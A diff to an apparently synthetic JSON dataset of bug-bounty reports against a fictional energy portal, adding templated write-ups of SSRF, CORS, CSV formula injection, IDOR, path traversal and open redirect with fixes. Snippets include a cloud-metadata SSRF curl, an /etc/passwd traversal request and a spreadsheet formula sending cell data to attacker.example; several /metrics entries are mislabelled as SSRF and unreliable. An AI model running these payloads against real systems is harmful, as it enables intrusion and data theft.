           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.rheinspitze-energie.foo/fetch`\n- Preconditions: authenticated user: citizen; app version: Console 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9965,7 +10040,8 @@
           "offset": "2d 13h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://kundenportal.rheinspitze-energie.foo/v2/me`\n- Preconditions: authenticated user: admin; app version: Auth 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10044,7 +10120,8 @@
           "offset": "4h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://kundenportal.rheinspitze-energie.foo/export?type=records`\n- Preconditions: authenticated user: admin; app version: Service 1.8\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10147,7 +10224,8 @@
           "offset": "3d 11h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://kundenportal.rheinspitze-energie.foo/export?type=records`\n- Preconditions: authenticated user: citizen; app version: API 2.3\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10294,7 +10372,8 @@
           "offset": "7d 17h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.rheinspitze-energie.foo/import`\n- Preconditions: authenticated user: support agent; app version: Mobile 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10412,7 +10491,8 @@
           "offset": "6d 16h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.rheinspitze-energie.foo/statements/`\n- Preconditions: authenticated user: admin; app version: Auth 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10567,7 +10647,8 @@
           "offset": "4d 22h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://api.rheinspitze-energie.foo/api/v2/documents/`\n- Preconditions: authenticated user: support agent; app version: Auth 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10710,7 +10791,8 @@
           "offset": "0h",
           "message": "Initial report filed with screenshots and logs."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://kundenportal.rheinspitze-energie.foo/statements/`\n- Preconditions: authenticated user: citizen; app version: Web 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10838,7 +10920,8 @@
           "offset": "2d",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.rheinspitze-energie.foo/statements/`\n- Preconditions: authenticated user: authenticated user; app version: API v2\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10962,7 +11045,8 @@
           "offset": "1d 2h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://auth.rheinspitze-energie.foo/export?type=records`\n- Preconditions: authenticated user: radiologist; app version: API 2.3\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -11126,7 +11210,8 @@
           "offset": "1d 14h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.rheinspitze-energie.foo/api/import`\n- Preconditions: authenticated user: radiologist; app version: Web 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -11289,7 +11374,8 @@
           "offset": "3d 9h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://api.rheinspitze-energie.foo/export?type=records`\n- Preconditions: authenticated user: support agent; app version: Web 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -11392,7 +11478,8 @@
           "offset": "1d 15h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://kundenportal.rheinspitze-energie.foo/import`\n- Preconditions: authenticated user: authenticated user; app version: Console 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -11556,7 +11643,8 @@
           "offset": "7d 9h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://api.rheinspitze-energie.foo/api/v2/documents/`\n- Preconditions: authenticated user: admin; app version: API 2.3\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -11686,7 +11774,8 @@
           "offset": "20h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.rheinspitze-energie.foo/metrics`\n- Preconditions: authenticated user: unauthenticated; app version: API 2.3\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -11805,7 +11894,8 @@
           "offset": "9d 9h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://auth.rheinspitze-energie.foo/profile`\n- Preconditions: authenticated user: authenticated user; app version: Auth 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -11928,7 +12018,8 @@
           "offset": "7d 4h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.rheinspitze-energie.foo/import`\n- Preconditions: authenticated user: citizen; app version: Service 1.8\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -12047,7 +12138,8 @@
           "offset": "2d 14h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://kundenportal.rheinspitze-energie.foo/import`\n- Preconditions: authenticated user: unauthenticated; app version: Console 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -12154,7 +12246,8 @@
           "offset": "3d",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://api.rheinspitze-energie.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: citizen; app version: Console 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -12270,7 +12363,8 @@
           "offset": "2d 13h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://api.rheinspitze-energie.foo/profile`\n- Preconditions: authenticated user: support agent; app version: Auth 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -12387,7 +12481,8 @@
           "offset": "4d 14h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.rheinspitze-energie.foo/metrics`\n- Preconditions: authenticated user: admin; app version: Service 1.8\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -12489,7 +12584,8 @@
           "offset": "1d 21h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://auth.rheinspitze-energie.foo/export`\n- Preconditions: authenticated user: authenticated user; app version: Auth 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -12628,7 +12724,8 @@
           "offset": "3d 23h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://kundenportal.rheinspitze-energie.foo/fetch`\n- Preconditions: authenticated user: radiologist; app version: Mobile 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -12710,7 +12807,8 @@
           "offset": "1d 21h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://auth.rheinspitze-energie.foo/export`\n- Preconditions: authenticated user: authenticated user; app version: Mobile 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -12825,7 +12923,8 @@
           "offset": "4d 23h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://auth.rheinspitze-energie.foo/export`\n- Preconditions: authenticated user: unauthenticated; app version: Auth 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -12983,7 +13082,8 @@
           "offset": "3d 16h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://www.rheinspitze-energie.foo/metrics`\n- Preconditions: authenticated user: support agent; app version: Portal 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -13131,7 +13231,8 @@
           "offset": "3d 6h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://www.rheinspitze-energie.foo/export`\n- Preconditions: authenticated user: support agent; app version: Mobile 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -13281,7 +13382,8 @@
           "offset": "3d 6h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.rheinspitze-energie.foo/metrics`\n- Preconditions: authenticated user: support agent; app version: Console 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -13380,7 +13482,8 @@
           "offset": "1d 8h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://www.rheinspitze-energie.foo/statements/`\n- Preconditions: authenticated user: citizen; app version: Service 1.8\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -13504,7 +13607,8 @@
           "offset": "3d 8h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://auth.rheinspitze-energie.foo/auth/callback?next=https://evil.foo`\n- Preconditions: authenticated user: radiologist; app version: Auth 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -13627,7 +13731,8 @@
           "offset": "23h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://auth.rheinspitze-energie.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: authenticated user; app version: Service 1.8\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -13755,7 +13860,8 @@
           "offset": "2d 20h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
